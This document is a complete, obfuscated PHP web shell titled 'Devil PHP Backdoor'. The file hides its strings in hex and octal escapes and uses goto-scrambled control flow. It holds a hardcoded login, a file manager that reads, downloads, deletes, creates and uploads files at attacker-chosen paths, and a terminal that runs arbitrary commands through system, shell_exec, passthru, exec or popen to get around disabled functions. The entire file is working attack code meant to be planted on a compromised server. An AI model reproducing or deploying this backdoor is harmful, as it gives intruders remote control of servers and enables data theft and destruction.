<?php
 goto NF05T; YPfBX: if (isset($_POST["\x6c\x6f\147\x69\156"]) && isset($_POST["\x70\141\163\x73"])) { if ($_POST["\154\x6f\x67\x69\156"] == "\116\x6f\x6d\141\156\120\x72\x6f\x64\150\x61\x6e" && $_POST["\x70\x61\x73\163"] == "\x4e\x6f\x6d\x61\x6e\x50\x72\x6f\x64\x68\x61\x6e\x40\x4b\x53") { $_SESSION["\154\x6f\x67\x69\x6e"] = "\x6c\157\x67\x67\145\144"; } } goto Zp5zn; NF05T: ob_start(); goto JEcBt; mQdYc: if (isset($_GET["\144\x65\154\145\164\145"]) && !empty($_GET["\144\x65\x6c\145\164\145"]) && isset($_GET["\x63\x68\x44\x69\162"])) { if (unlink($_GET["\x63\150\104\x69\162"] . "\x2f" . $_GET["\144\145\x6c\145\164\145"])) { $deleteFileFlag = "\106\151\154\x65\40\x68\x61\x73\40\x62\145\145\156\40\x64\x65\x6c\x65\164\145\144\56"; } else { $deleteFileFlag = "\103\157\165\154\x64\156\47\164\40\144\x65\x6c\x65\x74\x65\40\164\150\145\x20\146\151\x6c\x65\x2e"; } } goto Jtz3n; DEn3Z: function downloadFile($file) { if (file_exists($file)) { try { header("\103\157\156\164\x65\156\164\55\104\145\163\143\162\x69\160\164\x69\157\x6e\72\x20\x46\151\154\x65\40\124\x72\141\x6e\x73\x66\x65\x72"); header("\x43\x6f\156\x74\x65\x6e\164\x2d\x54\x79\160\145\72\40\x61\160\160\x6c\151\x63\141\x74\x69\x6f\x6e\57\157\x63\x74\x65\164\55\163\x74\162\145\x61\155"); header("\x43\157\x6e\164\x65\156\164\55\104\151\163\x70\157\163\x69\164\x69\157\156\x3a\x20\141\x74\164\x61\x63\150\155\145\156\164\x3b\x20\x66\151\154\145\x6e\x61\x6d\145\x3d\x22" . basename($file) . "\42"); header("\105\x78\x70\x69\x72\x65\163\72\40\x30"); header("\103\x61\x63\150\x65\55\103\x6f\156\164\x72\157\x6c\72\40\x6d\165\x73\164\55\x72\x65\166\141\x6c\151\x64\141\x74\x65"); header("\120\162\141\147\x6d\x61\x3a\40\160\165\x62\x6c\151\143"); header("\x43\x6f\156\x74\145\x6e\x74\x2d\114\x65\x6e\147\164\x68\72\40" . filesize($file)); readfile($file); die; } catch (Exception $e) { } } } goto Wd1_Z; wO6it: function uploadFile($path, $file) { $targetFile = $path . "\x2f" . basename($file["\x75\x70\154\157\x61\144\106\x69\x6c\x65"]["\x6e\x61\x6d\x65"]); if (!is_writable($path)) { return "\104\x6f\156\x27\164\40\x68\x61\166\145\40\x77\x72\x69\164\145\x20\160\x65\162\x6d\x69\x73\163\x69\157\x6e\56"; } else { if (move_uploaded_file($file["\165\160\154\157\x61\x64\106\151\x6c\145"]["\x74\155\160\x5f\x6e\141\155\x65"], $targetFile)) { return "\x46\x69\154\x65\40\x68\141\163\x20\142\x65\145\156\40\165\160\x6c\x6f\x61\x64\x65\x64\56"; } else { return "\103\x6f\165\154\x64\x6e\x27\x74\40\x75\x70\154\x6f\x61\x64\x20\x66\151\x6c\145\x2e"; } } } goto Yws85; qWjEv: function createFile($path, $name) { if (file_exists($path . "\57" . $name)) { echo "\x46\151\x6c\145\x20\x61\154\x72\x65\x61\x64\171\40\x65\170\x69\x73\x74\56"; } else { if (!is_writable($path)) { echo "\104\157\x6e\x27\x74\40\150\141\x76\145\x20\x77\162\151\x74\145\x20\x70\145\x72\x6d\151\x73\163\151\x6f\x6e\x2e"; } else { try { $file = fopen($path . "\x2f" . $name, "\167"); fwrite($file, "\164\x65\163\164"); fclose($file); return "\x46\151\154\x65\x20\x68\141\163\40\x62\x65\145\156\x20\x63\162\145\x61\x74\145\x64\56"; } catch (Exception $e) { return "\145\x72\162\157\162\56"; } } } } goto gH58q; jU1sD: if (!isset($_SESSION["\154\157\x67\151\x6e"])) { ?>
<div class="center">
    <h1>Login to Devil PHP Backdoor</h1><br>
    <form action="<?php  echo $_SERVER["\x50\110\x50\137\123\105\114\x46"]; ?>
" method="POST"><input name="login" placeholder="Login"> <input name="pass" placeholder="Pssword" type="password">
        <button type="submit">Login</button></form><br>
    <hr>
    <br><?php  echo "\74\x68\x32\x3e\x53\145\x72\166\x65\x72\x20\111\120\x20\72\x20" . $_SERVER["\123\x45\122\x56\x45\x52\x5f\x41\104\104\x52"] . "\74\57\150\62\x3e"; ?>
    <br>
    <hr>
</div><?php  } else { ?>
<h1 style="margin-top:20px">Devil PHP Backdoor</h1>
<table style="margin-top:20px">
    <tr>
        <td><a class="simple-nav-item" href="?action=system">System Info</a></td>
        <td><a class="simple-nav-item" href="?action=files">File Manager</a></td>
        <td><a class="simple-nav-item" href="?action=terminal">Terminal</a></td>
        <td><a class="simple-nav-item" href="?action=logout">Logout</a></td>
    </tr>
</table><br>
<h2>SERVER IP<?php  echo $_SERVER["\x53\105\x52\126\x45\x52\x5f\101\x44\104\x52"]; ?>
</h2>
<?php  echo posix_getpwuid(posix_geteuid())["\x6e\x61\155\x65"]; echo "\x40"; echo gethostname(); echo "\74\142\162\76" . getcwd(); ?>
<br><br>
<hr>
<br><?php  if (isset($_GET["\x61\143\x74\151\157\x6e"])) { if ($_GET["\x61\143\x74\151\157\x6e"] == "\146\151\x6c\145\x73") { if (isset($_GET["\x63\150\104\x69\162"]) && !empty($_GET["\x63\150\x44\x69\x72"])) { if (is_dir($_GET["\143\150\x44\x69\162"])) { if (is_readable($_GET["\143\150\104\151\162"])) { chdir(strval($_GET["\x63\150\x44\x69\x72"])); } else { echo "\104\x6f\x6e\x27\164\x20\150\x61\x76\x65\40\x72\145\141\144\40\x70\x65\x72\155\151\x73\163\x69\x6f\x6e\56"; } } else { echo "\x49\164\47\163\40\x6e\157\164\40\x61\x20\x64\151\162\x65\143\164\157\162\171\x2e"; } } ?>
<form action=""><input name="chDir" placeholder="Change working directory [Current :<?php  echo getcwd(); ?>
]" style="width:900px"> <input name="action" type="hidden" value="files"> <button type="submit">Change</button></form>
<?php  if (isset($deleteFileFlag)) { echo $deleteFileFlag; } ?>
<table class="table-1" style="width:1024px;height:500px;margin-bottom:25px">
    <tr>
        <td style="width:1000px;height:500px">
            <div class="fileManContent">
                <table style="width:100%">
                    <thead style="background:#0bdbca;color:#000">
                        <td>#</td>
                        <td>Name</td>
                        <td>Size</td>
                        <td>Perm</td>
                    </thead>
                    <tbody>
                        <?php  $dirList = scandir(getcwd()); $counter = 1; foreach ($dirList as $dirContent) { echo "\x3c\164\162\x20\x73\164\171\x6c\145\75\47\142\x61\143\153\147\x72\157\165\x6e\144\x3a\x20\x23\x34\x32\x34\65\x34\x33\73\40\x63\x6f\x6c\157\x72\x3a\x20\43\x66\146\146\x66\x66\146\x27\x3e"; echo "\74\x74\144\x3e"; echo $counter; $counter++; echo "\74\x2f\164\144\76"; echo "\74\x74\x64\76"; if (is_dir($dirContent)) { echo "\x3c\141\40\143\154\141\x73\x73\75\42\154\x69\x6e\153\x2d\61\x22\40\x68\162\145\146\75\47\77\x61\143\164\x69\x6f\x6e\75\x66\151\154\145\163\46\x63\x68\104\151\x72\75" . getcwd() . "\x2f" . $dirContent . "\x27\x3e" . $dirContent . "\74\x61\x2f\76\74\142\162\x3e"; } else { echo $dirContent; echo showDownloadLink($dirContent); echo showDeleteLink($dirContent); } echo "\74\x2f\164\x64\x3e"; echo "\x3c\164\144\76"; try { if (!is_dir($dirContent)) { $size = filesize($dirContent); if ($size > 1000) { $size /= 1000; if ($size > 1000) { $size /= 1000; echo round($size) . "\x20\x6d\x62"; } else { echo round($size) . "\x20\153\142"; } } else { echo $size . "\40\x62\171\x74\x65\x73"; } } else { echo "\x2d\55"; } } catch (Exception $e) { } echo "\x3c\x2f\x74\144\x3e"; echo "\x3c\x74\144\76"; try { echo filePrmissions($dirContent); } catch (Exception $e) { } echo "\x3c\x2f\x74\x64\x3e"; echo "\x3c\x2f\164\162\x3e"; } ?>
                    </tbody>
                </table>
            </div>
        </td>
        <td></td>
    </tr>
</table>
<table class="table-1">
    <td><?php  if (isset($createFolderFlag)) { echo $createFolderFlag; } ?>
        <form action="" method="POST"><input name="folderName" placeholder="Folder Name" style="width:320px"> <button
                type="submit">Create Folder</button></form>
    </td>
    <td><?php  if (isset($createFileFlag)) { echo $createFileFlag; } ?>
        <form action="" method="POST"><input name="fileName" placeholder="File Name" stype="text" tyle="width: 320px;">
            <button type="submit">Create File</button></form>
    </td>
    <tr>
        <td><?php  if (isset($uploadFileFlag)) { echo $uploadFileFlag; } ?>
            <form action="" method="POST" enctype="multipart/form-data"><input name="uploadFile"
                    placeholder="Select file" style="width:320px" type="file"> <button type="submit">Upload</button>
            </form>
        </td>
    </tr>
</table>
<br><?php  } elseif ($_GET["\x61\143\x74\x69\x6f\156"] == "\154\x6f\x67\157\165\x74") { unset($_SESSION["\x6c\x6f\x67\x69\x6e"]); session_destroy(); header("\x52\145\x66\x72\145\163\x68\x3a\x30"); } elseif ($_GET["\x61\x63\164\x69\x6f\156"] == "\x74\145\x72\x6d\151\x6e\x61\154") { ?>
<form action="" method="POST"><input name="command" placeholder="Command" style="width:900px"> <button
        type="submit">Execute</button></form>
<table class="table-1" style="width:1024;height:500px">
    <tr>
        <td>
            <pre><?php  if (isset($_POST["\143\x6f\x6d\155\141\156\144"]) && !empty($_POST["\x63\157\155\x6d\x61\x6e\x64"])) { if (!checkFunctions("\x73\171\163\164\145\x6d\163")) { system(strval($_POST["\x63\157\x6d\x6d\141\156\x64"]), $SystemResult); } elseif (!checkFunctions("\163\x68\145\154\x6c\x5f\x65\x78\145\143\x73")) { echo shell_exec(strval($_POST["\143\x6f\155\x6d\x61\156\144"])); } elseif (!checkFunctions("\160\141\163\x73\164\x68\162\165")) { echo passthru(strval($_POST["\143\157\x6d\x6d\141\x6e\144"])); } elseif (!checkFunctions("\x65\170\145\x63")) { exec(strval($_POST["\143\157\155\x6d\141\156\x64"]), $ExecResult, $retval); foreach ($ExecResult as $output) { echo $output . "\74\x62\162\76"; } } elseif (!checkFunctions("\160\157\160\x65\x6e")) { $handle = popen(strval($_POST["\x63\157\155\155\x61\x6e\144"]) . "\x20\62\76\x26\x31", "\x72"); $read = fread($handle, 2096); echo $read; fclose($handle); } else { echo "\x3c\x68\x31\76\123\x6f\162\x72\x79\x2c\40\x63\x61\x6e\x27\164\x20\145\x78\145\143\x75\164\x65\x20\143\x6f\x6d\155\x61\x6e\x64\x20\x21\x3c\x2f\x68\61\76"; } } ?>
</pre>
        </td>
    </tr>
</table><?php  } else { ?>
<table class="table-1">
    <tr>
        <td>Operating System</td>
        <td><?php  echo php_uname("\163"); ?>
        </td>
    </tr>
    <tr>
        <td>Release Name</td>
        <td><?php  echo php_uname("\162"); ?>
        </td>
    </tr>
    <tr>
        <td>Version Information</td>
        <td><?php  echo php_uname("\x76"); ?>
        </td>
    </tr>
    <tr>
        <td>Host Name</td>
        <td><?php  echo php_uname("\x6e"); ?>
        </td>
    </tr>
    <tr>
        <td>Machine Type</td>
        <td><?php  echo php_uname("\155"); ?>
        </td>
    </tr>
    <tr>
        <td>PHP Version</td>
        <td><?php  echo phpversion(); ?>
        </td>
    </tr>
    <tr>
        <td>PHP Interface</td>
        <td><?php  echo php_sapi_name(); ?>
        </td>
    </tr>
    <tr>
        <td>Server IP</td>
        <td><?php  echo $_SERVER["\123\x45\x52\x56\105\x52\137\101\x44\x44\122"]; ?>
        </td>
    </tr>
    <tr>
        <td>User</td>
        <td><?php  echo posix_getpwuid(posix_geteuid())["\156\141\155\145"]; ?>
        </td>
    </tr>
    <tr>
        <td>Disabled PHP Functions</td>
        <td><?php  echo ini_get("\x64\x69\x73\x61\x62\154\145\137\x66\165\x6e\x63\164\x69\x6f\156\x73"); ?>
        </td>
    </tr>
</table><?php  } } else { ?>
<h1>Welcome to Devil PHP Backdoor</h1>
<?php  } } goto UgpIw; Zp5zn: function checkFunctions($param) { $disabled_functions = explode("\54", ini_get("\144\x69\x73\x61\x62\154\x65\x5f\146\x75\x6e\143\x74\151\x6f\156\x73")); return in_array($param, $disabled_functions); } goto qWjEv; xN9_z: ?>
<!doctypehtml>
    <html>

    <head>
        <title>Devil PHP Backdoor</title>
        <style>
        ::-webkit-scrollbar {
            width: 10px
        }

        ::-webkit-scrollbar-track {
            box-shadow: inset 0 0 5px grey;
            border-radius: 5px
        }

        ::-webkit-scrollbar-thumb {
            background: #24484a;
            border-radius: 5px
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #0bdbca
        }

        * {
            margin: 0;
            padding: 0
        }

        body {
            background: #000;
            color: #0bdbca;
            max-width: 1024px;
            margin: auto;
            font-family: 'Courier New', Courier, monospace
        }

        .center {
            margin: 0;
            position: absolute;
            top: 50%;
            left: 50%;
            -ms-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%)
        }

        input {
            width: auto;
            border: #0bdbca 2px solid;
            background: #000;
            color: #0bdbca;
            height: 30px;
            width: 200px;
            padding: 10px;
            font-size: 18px;
            font-family: 'Courier New', Courier, monospace;
            outline: 0
        }

        input:focus {
            border: #0bdbca 2px solid;
            background: #000;
            color: #0bdbca
        }

        button {
            background: #0bdbca;
            color: #000;
            outline: 0;
            padding: 10px;
            font-family: 'Courier New', Courier, monospace;
            border: #0bdbca 2px solid;
            height: 55px
        }

        .simple-nav {
            background: #000;
            border: #0bdbca 2px solid;
            height: 40px;
            width: 100%
        }

        .simple-nav-item {
            text-decoration: none;
            height: 40px;
            border: #000 1px solid;
            background: #0bdbca;
            color: #000;
            padding: 10px
        }

        .table-1 {
            margin-top: 20px;
            border: #0bdbca 2px solid;
            width: 100%;
            max-width: 1920px
        }

        td {
            padding: 5px
        }

        pre {
            height: 500px;
            width: 1000px;
            text-align: left;
            overflow: scroll;
            font-size: 13px
        }

        .main-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            height: auto;
            padding: 20px
        }

        .link-1 {
            text-decoration: none;
            color: #0bdbca
        }

        .link-2 {
            text-decoration: none;
            color: #fff
        }

        .fileManContent {
            width: 994px;
            height: 500px;
            overflow: scroll;
            margin: 0;
            padding: 0
        }

        .fileManContent thead th {
            position: sticky;
            top: 0
        }

        a {
            text-decoration: none;
            color: #09947d
        }
        </style>
    </head>

    <body>
        <div>
            <?php  goto jU1sD; JEcBt: session_start(); goto YPfBX; gH58q: function createFolder($path, $name) { if (is_dir($path . "\57" . $name)) { return "\106\157\x6c\144\x65\162\x20\x61\x6c\x72\145\x61\144\171\40\x65\x78\x69\x73\x74\56"; } else { if (!is_writable($path)) { return "\x44\x6f\x6e\x27\x74\40\150\x61\166\145\40\167\162\151\164\x65\x20\x70\145\x72\x6d\x69\163\163\x69\x6f\x6e\x2e"; } else { try { mkdir($path . "\x2f" . $name, 511); return "\106\x6f\154\x64\x65\x72\40\x68\141\163\40\142\145\145\x6e\x20\x63\162\145\x61\164\x65\x64\x2e"; } catch (Exception $e) { return "\x65\162\x72\157\x72\x2e"; } } } } goto wO6it; nslsP: function filePrmissions($file) { $perms = fileperms($file); switch ($perms & 61440) { case 49152: $info = "\x73"; break; case 40960: $info = "\154"; break; case 32768: $info = "\55"; break; case 24576: $info = "\142"; break; case 16384: $info = "\x64"; break; case 8192: $info = "\143"; break; case 4096: $info = "\160"; break; default: $info = "\x75"; } $info .= $perms & 256 ? "\x72" : "\x2d"; $info .= $perms & 128 ? "\167" : "\55"; $info .= $perms & 64 ? $perms & 2048 ? "\x73" : "\170" : ($perms & 2048 ? "\123" : "\x2d"); $info .= $perms & 32 ? "\162" : "\x2d"; $info .= $perms & 16 ? "\x77" : "\x2d"; $info .= $perms & 8 ? $perms & 1024 ? "\163" : "\170" : ($perms & 1024 ? "\123" : "\x2d"); $info .= $perms & 4 ? "\162" : "\x2d"; $info .= $perms & 2 ? "\x77" : "\55"; $info .= $perms & 1 ? $perms & 512 ? "\164" : "\x78" : ($perms & 512 ? "\124" : "\x2d"); return $info; } goto mDIY_; U8v5_: if (isset($_FILES["\165\160\x6c\157\141\144\106\x69\x6c\145"]) && !empty($_FILES["\x75\x70\154\x6f\141\144\106\x69\x6c\x65"]["\156\141\x6d\145"])) { $dir = getcwd(); if (isset($_GET["\x63\x68\104\151\x72"]) && !empty($_GET["\143\150\x44\x69\162"])) { $dir = $_GET["\x63\150\x44\151\x72"]; } $uploadFileFlag = uploadFile($dir, $_FILES); } goto xN9_z; Wd1_Z: function showDownloadLink($file) { $dir = getcwd(); if (isset($_GET["\143\x68\104\151\x72"])) { $dir = $_GET["\143\150\104\x69\162"]; } echo "\74\141\x20\x68\162\145\x66\x3d\42\x3f\x61\143\164\x69\157\x6e\x3d\146\x69\154\x65\163\x26\x63\150\x44\151\162\x3d" . $dir . "\46\144\157\x77\x6e\154\157\141\x64\75" . $file . "\x22\x2f\x3e\133\104\x6f\x77\156\154\x6f\141\144\x5d\74\x2f\x61\x3e"; } goto IZkan; Jtz3n: if (isset($_POST["\146\151\154\x65\x4e\x61\155\145"]) && !empty($_POST["\x66\x69\154\x65\116\141\x6d\145"])) { $dir = getcwd(); if (isset($_GET["\143\150\x44\x69\162"]) && !empty($_GET["\x63\x68\x44\x69\x72"])) { $dir = $_GET["\x63\x68\104\x69\162"]; } $createFileFlag = createFile($dir, $_POST["\146\x69\x6c\x65\116\141\155\x65"]); } goto CDhow; IZkan: function showDeleteLink($file) { $dir = getcwd(); if (isset($_GET["\143\x68\104\151\x72"])) { $dir = $_GET["\x63\x68\x44\151\x72"]; } echo "\x3c\141\40\150\162\x65\146\75\42\77\141\143\164\151\x6f\156\x3d\x66\151\154\x65\163\46\143\x68\x44\151\162\75" . $dir . "\46\144\x65\154\145\x74\x65\75" . $file . "\42\40\x73\164\171\154\145\75\42\x63\157\x6c\x6f\x72\x3a\x20\162\x65\x64\x3b\42\x2f\76\x5b\x44\x65\x6c\145\164\x65\x5d\x3c\57\x61\x3e"; } goto nslsP; CDhow: if (isset($_POST["\146\x6f\x6c\x64\x65\x72\x4e\x61\155\x65"]) && !empty($_POST["\146\x6f\x6c\144\x65\162\x4e\x61\x6d\x65"])) { $dir = getcwd(); if (isset($_GET["\x63\150\104\x69\x72"]) && !empty($_GET["\143\x68\104\151\x72"])) { $dir = $_GET["\x63\150\x44\x69\x72"]; } $createFolderFlag = createFolder($dir, $_POST["\x66\157\x6c\144\145\x72\x4e\x61\x6d\145"]); } goto U8v5_; mDIY_: if (isset($_GET["\144\x6f\x77\156\154\157\x61\144"]) && !empty($_GET["\x64\x6f\167\x6e\154\157\141\x64"]) && isset($_GET["\143\150\104\x69\162"])) { downloadFile($_GET["\x63\x68\x44\x69\x72"] . "\57" . $_GET["\144\x6f\167\x6e\x6c\x6f\141\x64"]); } goto mQdYc; Yws85: function getFileMime($file) { return mime_content_type($file); } goto DEn3Z; UgpIw: ?>
        </div>
    </body>

    </html>